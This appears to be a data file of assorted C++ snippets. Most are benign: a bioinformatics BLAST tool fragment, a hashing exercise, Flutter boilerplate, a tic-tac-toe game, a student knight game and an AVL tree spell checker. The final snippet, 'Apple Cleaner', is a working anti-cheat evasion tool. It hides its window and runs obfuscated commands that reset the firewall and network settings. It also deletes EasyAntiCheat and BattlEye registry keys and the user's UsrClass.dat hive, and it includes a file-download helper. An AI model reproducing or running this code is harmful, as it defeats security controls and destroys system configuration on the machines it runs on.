optarg;\r\n\t\t\t//\tbreak;\r\n\t\t\tcase 'd':\r\n\t\t\t\tdb_path = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'p':\r\n\t\t\t\tfull_path = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'o':\r\n\t\t\t\tout_filename = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'f':\r\n\t\t\t\tmultiblast = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 's':\r\n\t\t\t\tsequence = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'i':\r\n\t\t\t\tin1_filename = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'r': {\r\n\t\t\t\tspecified_ranks = true;\r\n\t\t\t\tranks_arg = optarg;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\tusage(argv[0]);\r\n\t\t}\r\n\t}\r\n\r\n\tnodes_filename = db_path + \"/FASTA/nodes.dmp\";\r\n\tnames_filename = db_path + \"/FASTA/names.dmp\";\r\n\t//Extract accession numbers from BLAST xml or multiBLAST table\r\n\tstd::cout << \"Generating taxid2commonname dictionary from...\" << names_filename << std::endl;\r\n\r\n\tcreateDictionary(taxid2name_dictionary, names_filename);\r\n\tstd::vector<std::string> accession_nos;\r\n\tif (multiblast == \"true\") {\r\n\t\tstd::cout << \"MultiBLAST table selected as input: \" << in1_filename << std::endl;\r\n\t\taccession_nos = extractHitAccessionsMultiBLAST(in1_filename);\r\n\t} else if (multiblast == \"false\"){\r\n\t\tstd::cout << \"BLAST .xml file selected as input: \" << in1_filename << std::endl;\r\n\t\taccession_nos = extractHitAccessions(in1_filename);\r\n\t} else if (multiblast == \"diamond\") {\r\n\t\tstd::cout << \"Diamond output selected as input: \" << in1_filename << std::endl;\r\n\t\t\r\n\t}\r\n\t// Print the extracted accession numbers\r\n    //for (const auto& accession : acces",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nvoid rotate(vector<int> &arr)\n{\n    int last_element = arr.back();\n    arr.pop_back();\n    arr.insert(arr.begin(), last_element);\n}\n\nstring isomorphMatrix(string s)\n{\n    int sizeOfString = s.size();\n    vector<int> temp;\n    map<char, int> charMap;\n    int uniqueCharCount = 0;\n    for (char c : s)\n    {\n        if (charMap.find(c) == charMap.end())\n        {\n            charMap[c] = uniqueCharCount++;\n        }\n        temp.push_back(charMap[c]);\n    }\n\n    vector<vector<int>> tempArr(sizeOfString, vector<int>(sizeOfString));\n\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            tempArr[i][j] = temp[j];\n        }\n        rotate(temp);\n    }\n\n    string matrixString = s;\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            matrixString += to_string(tempArr[i][j]);\n        }\n    }\n\n    return matrixString;\n}\n\nsize_t calcHash(string s)\n{\n    size_t p = 31;\n    size_t m = 1e9 + 9;\n    size_t hash_value = 0;\n    size_t p_pow = 1;\n    for (char c : s)\n    {\n        hash_value = (hash_value + (c - 'a' + 1) * p_pow) % m;\n        p_pow = (p_pow * p) % m;\n    }\n    return hash_value;\n}\n\nint main()\n{\n    string password = \"egg\";\n    string matrixString = isomorphMatrix(password);\n    size_t hashValue = calcHash(matrixString);\n    cout << hashValue;\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string>\n#include <iostream>\n\nusing namespace std;\n\n\n//Functions Header\nvoid fMainMenu();\nvoid fGameScreen();\n\n\n//Function: Cleans Terminal\nvoid fScreenCleaner()\n{\n\tsystem(\"CLS\");\n}\n\n\n//Function: Ends Terminal\nvoid fExitGame()\n{\n\texit(0);\n}\n\n\n//Function: About the Game Screen\nvoid fAboutScreen()\n{\nfScreenCleaner();\nint iOption = 0;\nwhile (iOption == 0)\n{\n\tcout << \"!!!!ABOUT!!\\n\";\n\tcout << \"!!!!THE!!!!\\n\";\n\tcout << \"!!!!GAME!!!\\n\\n\";\n\tcout << \"This is a Game of Tic-Tac-Toe in which you play against another player to score marks in a row, column or diagonaly.\\n\";\n\tcout << \"By Succesfully scoring in one of those three ways, you will be declared the Winner of the Match.\\n\";\n\tcout << \"This is a Game made for Studying purposes\\n\\n\";\n\tcout << \"Credits: Jefferson Souza aka Sarmyte\\n\\n\";\n\tcout << \"Input 1 to go Back to the Main Menu: \\n\";\n\tcin >> iOption;\n}\n\nfMainMenu();\n\n}\n\n\n//Function: Checks Rows, Columns and Diagonals to determine a Winner and Prints the Winner on the Screen\nvoid fGameWinnerCheckandScreen(char cBoard[3][3],int iPlayerTurn)\n{\n\tint iBoardRows, iBoardColumns;\n\n\t//Checking for Game Winner and Winner Screen.\n\tfor (iBoardRows = 0; iBoardRows < 3; iBoardRows++)\n\t{\n\t\tif (cBoard[iBoardRows][0] != '-' && cBoard[iBoardRows][0] == cBoard[iBoardRows][1] && cBoard[iBoardRows][1] == cBoard[iBoardRows][2])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[iBoardRows][0] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\tif (cBoard[iBoardRows][0] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t}\n\tfor (iBoardColumns = 0; iBoardColumns < 3; iBoardColumns++)\n\t{\n\t\tif (cBoard[0][iBoardColumns] != '-' && cBoard[0][iBoardColumns] == cBoard[1][iBoardColumns] && cBoard[1][iBoardColumns] == cBoard[2][iBoardColumns])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[0][iBoardColumns] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tif (cBoard[0][iBoardColumns] == 'O')\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (cBoard[0][0] != '-' && cBoard[0][0] == cBoard[1][1] && cBoard[1][1] == cBoard[2][2] || cBoard[0][2] != '-' && cBoard[0][2] == cBoard[1][1] && cBoard[1][1] == cBoard[2][0])\n\t{\n\t\tfScreenCleaner();\n\t\tint iOptions = 0;\n\t\twhile (iOptions == 0)\n\t\t{\n\t\t\tif (cBoard[1][1] == 'X')\n\t\t\t{\n\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t\tif (cBoard[1][1] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\tcin >> iOptions;\n\n\t\t\tswitch (iOptions)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tfGameScreen();\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tfMainMenu();\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tcout << \"See You Later\";\n\t\t\t\tfExitGame();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n//Function: Displays Current player Turn and Message to check if the selected place marked is still valid to mark\nvoid fGameSystemMessages(int iPlayerTurn, string sGameFeedbackMessage)\n{\n\tif (iPlayerTurn == 1)\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 01 \\n\\n\";\n\t}\n\telse\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 02 \\n\\n\";\n\t}\n}\n//Function: Prints the Game Board on Screen\nvoid fGameBoard(char cBoard[3][3])\n{\n\tint iBoardRows, iBoardColumns;\n\tint iCounter = 0;\n\tstring sRows = \"Rows\";\n\tcout << \"       Columns\\n\" << \"      0   1   2\\n\\n\";\n\n\t\tfor (iBoardRows = 0; iBoardRows <= 3; iBoardRows++)\n\t\t{\n\t\t\tif (iCounter < 4)\n\t\t\t{\n\t\t\t\tcout << sRows[iCounter] << \"  \";\n\t\t\t\tiCounter++;\n\t\t\t}\n\t\t\tif (iBoardRows < 3)\n\t\t\t{\t\n\t\t\t\tif (iBoardRows == 2)\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"   \";\n\t\t\t\t\t}\n\t\t\t\tcout << iBoardRows << \" \";\n\n\t\t\t\tfor (iBoardColumns = 0; iBoardColumns < 3; iB",
    "#include \"knight.h\"\n\nvoid display(int HP, int level, int remedy, int maidenkiss, int phoenixdown, int rescue)\n{\n    cout << \"HP=\" << HP\n         << \", level=\" << level\n         << \", remedy=\" << remedy\n         << \", maidenkiss=\" << maidenkiss\n         << \", phoenixdown=\" << phoenixdown\n         << \", rescue=\" << rescue << endl;\n}\n\nint Check(int &HP)\n{\n    HP += 1;\n    if (Check_Prime(HP) == false)\n        Check(HP);\n    return HP;\n}\n\nvoid Solve_line_3(string line_3, string &file_1, string &file_2, string &file_3)\n{\n    string tokens[3];\n    stringstream check1(line_3);\n    string intermediate;\n    int k = 0;\n    while (getline(check1, intermediate, ','))\n    {\n        tokens[k] = intermediate;\n        k++;\n    }\n    file_1 = tokens[0];\n    file_2 = tokens[1];\n    file_3 = tokens[2];\n}\n\nvoid Fibonacci(int *Fibo) // B\u1ed5 tr\u1ee3 h\u00e0m event 12\n{\n    Fibo[0] = 0;\n    Fibo[1] = 1;\n    for (int i = 2; i < 18; i++) // V\u00ec s\u1ed1 fibo th\u1ee9 17 b\u1eb1ng 1.597.\n    {\n        Fibo[i] = Fibo[i - 1] + Fibo[i - 2];\n    }\n}\n\nvoid Check_Condition(int &HP, int HP_MAX, int &level, int &phoenixdown, int &remedy, int &maidenkiss, int &condition, int tmp_level, int &rescue, int index, int event) // Sau 1 turn, n\u1ebfu m\u00e1u b\u00e9 h\u01a1n 0, ki\u1ec3m tra c\u00f2n phoenixdown hay ko, ko th\u00ec thua.\n{\n\n    if (HP < 0)\n    {\n        if (phoenixdown > 0)\n        {\n            HP = HP_MAX;\n            phoenixdown--;\n        }\n        else\n            rescue = 0;\n    }\n    else if (condition == 1 && remedy > 0)\n    {\n        condition = 0;\n        remedy--;\n        HP *= 5;\n        HP = min(HP, HP_MAX);\n    }\n\n    else if (condition == 2 && maidenkiss > 0)\n    {\n        condition = 0;\n        maidenkiss--;\n        level = tmp_level;\n    }\n\n    if (index == event - 1 && HP > 0)\n        rescue = 1;\n}\n\nvoid Check_Phoenixdown(int &HP, int HP_MAX, int &phoenixdown)\n{\n    if (HP < 0)\n    {\n        if (phoenixdown > 0)\n        {\n            HP = HP_MAX;\n            phoenixdown--;\n        }\n    }\n}\n\nvoid Even_1(int &rescue, int event) // Bowser \u0111\u1ea7u h\u00e0ng v\u00e0 tr\u1ea3 l\u1ea1i c\u00f4ng ch\u00faa\n{\n    if (event == 0)\n        rescue = 1;\n}\n\nvoid Even_2(int &HP, int &level, int index, int event) // G\u1eb7p g\u1ea5u MadBear, c\u01b0\u1edbp Bandit, t\u01b0\u1edbng c\u01b0\u1edbp LordLupin, y\u00eau tinh Elf, qu\u1ef7 kh\u1ed5ng l\u1ed3 Troll\n{\n    int basedame; // Basedame c\u1ee7a 5 t\u01b0\u1edbng \u0111\u1ea7u.\n    switch (event)\n    {\n    case 1:\n    {\n        basedame = 10;\n        break;\n    }\n    case 2:\n    {\n        basedame = 15;\n        break;\n    }\n    case 3:\n    {\n        basedame = 45;\n        break;\n    }\n    case 4:\n    {\n        basedame = 75;\n        break;\n    }\n    case 5:\n    {\n        basedame = 95;\n        break;\n    }\n    }\n    int b = index % 10;\n    int level0 = index > 6 ? (b > 5 ? b : 5) : b;\n    int damage = basedame * level0; // T\u1ed5ng dame g\u00e2y ra cho hi\u1ec7p s\u0129 khi level th\u1ea5p h\u01a1n level0 c\u1ee7a t\u01b0\u1edbng.\n    if (level > level0 && level < 10)\n        level = (int)min(++level, 10);\n    else if (level < level0)\n        HP -= damage;\n}\n\nvoid Even_3(int &HP, int HP_MAX, int &level, int index, int &count, int &remedy, int event, int &condition) // G\u1eb7p ph\u00f9 thu\u1ef7 Shaman\n{\n    if (event == 6)\n    {\n        if (count < 0) // Count <= 0 c\u00f3 ngh\u0129a l\u00e0 \u0111ang ko b\u1ecb bi\u1ebfn th\u00e0nh \u1ebfch ho\u1eb7c t\u00ed hon, v\u00ec khi \u0111ang l\u00e0 t\u00ed hon ho\u1eb7c \u1ebfch th\u00ec b\u1ecf qua ph\u00f9 th\u1ee7y v\u00e0 Siren.\n        {\n            int level0 = index;\n            if (level > level0)\n                level = min(level + 2, 10);\n            else if (level0 > level)\n            {\n                if (HP >= 5)\n                    HP /= 5;\n                else\n                    HP = 1;\n                if (remedy > 0)\n                {\n                    remedy--;\n                    HP *= 5;\n                    HP = min(HP, HP_MAX);\n                }\n                else\n                {\n                    count = 4; // B\u1ecb bi\u1ebfn t\u00ed hon trong ch\u00ednh tr\u1eadn \u0111\u00f3 v\u00e0 3 tr\u1eadn ti\u1ebfp\n                    condition = 1;\n                }\n            }\n        }\n    }\n}\n\nvoid Even_4(int &level, int &maidenkiss, int &count, int &tmp_level, int index, int event, int &condition) // G\u1eb7p Siren Vajsh\n{\n    if (event == 7)\n    {\n        if (count <= 0) // T\u01b0\u01a1ng t\u1ef1 even_3\n        {\n            int level0 = index;\n            if (level > level0 && level < 10)\n                level = min(level + 2, 10);\n            else if (level0 > level)\n            {\n                if (maidenkiss > 0)\n                    maidenkiss--;\n                else\n                {\n                    condition = 3;\n                    tmp_level = level;\n                    level = 1;\n                    count = 4; // T\u01b0\u01a1ng t\u1ef1 even_3\n                }\n            }\n        }\n    }\n}\n\nvoid Even_5(int &HP, int HP_MAX, int &level, int &phoenixdown, int event) // Nh\u1eb7t \u0111\u01b0\u1ee3c n\u1ea5m t\u0103ng l\u1ef1c MushMario\n{\n    if (event == 11)\n    {\n        int n1 = ((level + phoenixdown) % 5 + 1) * 3;\n        int k = 1;\n        int s1 = 0;\n        int tmp = 99;\n        while (k <= n1)\n        {\n            s1 += tmp;\n            tmp -= 2;\n            ++k;\n        } // s1 l\u00e0 t\u1ed5ng n1 s\u1ed1 l\u1ebb l\u1edbn nh\u1ea5t c\u00f3 2 ch\u1eef s\u1ed1\n        HP += s1 ",
    "//\n// Created by abelg on 2023-03-18.\n//\n\n#include <ostream>\n#include <iomanip>\n#include <iostream>\n#include <fstream>\n#include <regex>\n#include \"BST.h\"\n#include \"Node.h\"\n\n\nvoid BST::insert(std::string word) {\n    m_root = insert(word, m_root);\n}\n\nNodePtr BST::insert(std::string word, NodePtr &node) {\n    if (node == nullptr) {\n        // node = new Node();\n        // node->m_data = word;\n        return new Node{word, nullptr, nullptr, 1};\n    } else {\n        //add node to existing tree\n        if (word < node->m_data) {\n            //go left\n            node->m_left = insert(word, node->m_left);\n        } else if (word > node->m_data) {\n            //go right\n            node->m_right = insert(word, node->m_right);\n        } else\n            return node;\n        // std::cout << \"duplicate value\" << std::endl;\n    }\n\n\n    node->m_height = std::max(height(node->m_left), height(node->m_right)) + 1;\n    //calculate the balance factor of node\n    int bf = balance_factor(node);\n\n    //check if right rotation is possible\n    if (bf > 1 && word < node->m_left->m_data)\n        return rotate_right(node);\n\n    //check if left rotation is possible\n    if (bf < -1 && word > node->m_right->m_data)\n        return rotate_left(node);\n\n    //check if double rotation is possible LR\n    if (bf > 1 && word > node->m_left->m_data) {\n        node->m_left = rotate_left(node->m_left);\n        return rotate_right(node);\n    }\n\n    //check if double rotation is possible RL\n    if (bf < -1 && word < node->m_right->m_data) {\n        node->m_right = rotate_right(node->m_right);\n        return rotate_left(node);\n    }\n    return node;\n}\n\n\nvoid BST::print(std::ostream &output, NodePtr &node, int indent = 0) {\n    if (node == nullptr) {\n        return;\n    }\n    if (node != nullptr) {\n        print(output, node->m_right, indent + 8);\n        output << std::setw(indent) << node->m_data << std::endl;\n        print(output, node->m_left, indent + 8);\n    }\n}\n\nstd::ostream &operator<<(std::ostream &output, BST &bst) {\n    bst.print(output, bst.m_root, 0);\n    return output;\n}\n\nvoid BST::remove(std::string word) {\n    NodePtr node = m_root;\n    NodePtr parent = nullptr;\n\n    //search for the node to delete\n    while (node != nullptr) {\n        if (word < node->m_data) {\n            //go left\n            parent = node;\n            node = node->m_left;\n        } else if (word > node->m_data) {\n            // go right\n            parent = node;\n            node = node->m_right;\n        } else {\n            //found the node\n            break;\n        }\n    }\n\n    //didn't find the node\n    if (node == nullptr) {\n        return;\n    }\n    //if a node has two children\n    //use the right most node in the left tree as successor\n    if (node->m_right != nullptr && node->m_left != nullptr) {\n        //start on the left subtree\n        NodePtr successor = node->m_left;\n        parent = node;\n        //go as far right as possible\n        while (successor->m_right != nullptr) {\n            parent = successor;\n            successor = successor->m_right;\n        }\n\n        //swap values with successor\n        node->m_data = successor->m_data;\n        //the successor become the node to delete\n        node = successor;\n\n    }\n\n    //assume there is a subtree on the left\n    NodePtr subTree = node->m_left;\n\n    if (subTree == nullptr) {\n        subTree = node->m_right;\n    }\n\n    //delete nod with no children\n    if (parent == nullptr) {\n        //deleting the root node\n    } else if (node == parent->m_left) {\n        //detach from parte's left side\n        parent->m_left = subTree;\n    } else if (node == parent->m_right) {\n        //detach from parent's right side\n        parent->m_right = subTree;\n    }\n\n    //deleting node\n    delete node;\n}\n\nvoid BST::search_tree(std::string word) {\n    std::string pure_word;\n    //remove any non string characters\n    for (char c: word) {\n        if (isalpha(c)) {\n            pure_word += c;\n        }\n    }\n    //check if the word is a valid string\n    if (std::regex_match(pure_word, std::regex(\"[A-z]+\"))) {\n        NodePtr result = search_tree(m_root, pure_word);\n        //check if the searched word is available in the tree\n        if (result == nullptr) {\n            std::cout << \"Incorrect spelled word  - \" << pure_word << std::endl;\n        }\n    }\n}\n\nNodePtr BST::search_tree(NodePtr &nodePtr, std::string word) {\n    //convert word to lower case for comparison\n    std::transform(word.begin(), word.end(), word.begin(), ::tolower);\n    if (nodePtr == nullptr || nodePtr->m_data == word) {\n        return nodePtr;\n    }\n\n    // If the value is less than the root's data\n    if (word < nodePtr->m_data) {\n        // Search in the left subtree\n        return search_tree(nodePtr->m_left, word);\n    } else {\n        // Search in the right subtree\n        return search_tree(nodePtr->m_right, word);\n    }\n}\n\n\nint BST::height(NodePtr &nodePtr) {\n\n    if (nodePtr == nullptr) return 0;\n    return nodePtr->m_height;\n}\n\nint BST::balance",
    "#include <Windows.h>\r\n#include <string>\r\n#include <iostream>\r\n#include \"xor.h\"\r\n#include <urlmon.h>\r\n#include <lmcons.h>\r\n#include \"xor.h\"\r\n#pragma comment(lib, \"urlmon\")\r\n// KRNL ON TOP\r\nstd::wstring GetCurrentUserName()\r\n{\r\n\r\n\r\n\t\r\n\twchar_t un[256 + 1];\r\n\r\n\tDWORD unLen = 256 + 1;\r\n\r\n\tGetUserNameW(un, &unLen);\r\n\r\n\treturn un;\r\n\r\n}\r\nnamespace util {\r\n\r\n\tvoid download_file(LPCSTR dest, LPCSTR url)\r\n\t{\r\n\r\n\t\tURLDownloadToFileA(NULL, dest, url, NULL, NULL);\r\n\r\n\r\n\t}\r\n\r\n\tvoid hide()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n\t}\r\n\tvoid show()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n\t}\r\n}\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\nvoid clean_launcher() {\r\n\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Base.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\WindowsGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseInput.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\BaseWindowsLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserScalability.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseHardware.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\NotForLicensees\\\\Windows\\\\WindowsHardware.ini\");\r\n}\r\nvoid clean_net() {\r\n\tutil::hide();\r\n\tsystem(_xor_(\"netsh winsock reset\").c_str());\r\n\tsystem(_xor_(\"netsh winsock reset catalog\").c_str());\r\n\tsystem(_xor_(\"netsh int ip reset\").c_str());\r\n\tsystem(_xor_(\"netsh advfirewall reset\").c_str());\r\n\tsystem(_xor_(\"netsh int reset all\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv4 reset\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv6 reset\").c_str());\r\n\tsystem(_xor_(\"ipconfig / release\").c_str());\r\n\tsystem(_xor_(\"ipconfig / renew\").c_str());\r\n\tsystem(_xor_(\"ipconfig / flushdns\").c_str());\r\n\tsystem(\"cls\");\r\n\tutil::show();\r\n}\r\nvoid clean_anticheat() {\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BEService /f\").c_str());\r\n}\r\nint main()\r\n{\r\n\tSleep(500);\r\n\r\n\tutil::hide();\r\n\r\n\tSleep(2000);\r\n\tutil::show();\r\n\r\n\tsystem(\"Color 0b\");\r\n\t// LAUNCH CLEAN\r\n\tSetConsoleTitleA(\"Apple Cleaner (Updated to S4)\");\r\n\tprintf(\"Apple Cleaner\\n\\n\");\r\n\tprintf(\"[+] Searching for tracking files...\");\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\usrclass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Vault\\\\UserProfileRoaming\\\\Latest.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat)\").c_str()) != 0)\r\n\t\r\n\t\t\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat.log1\\n\");\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n        printf(\"\\n[+] System clean\");\r\n\t\tprintf(\"\\nPress any key to continue . . .\");\r\n\t// END OF LAUNCH CLEAN\r\n\tsystem(\"pause > 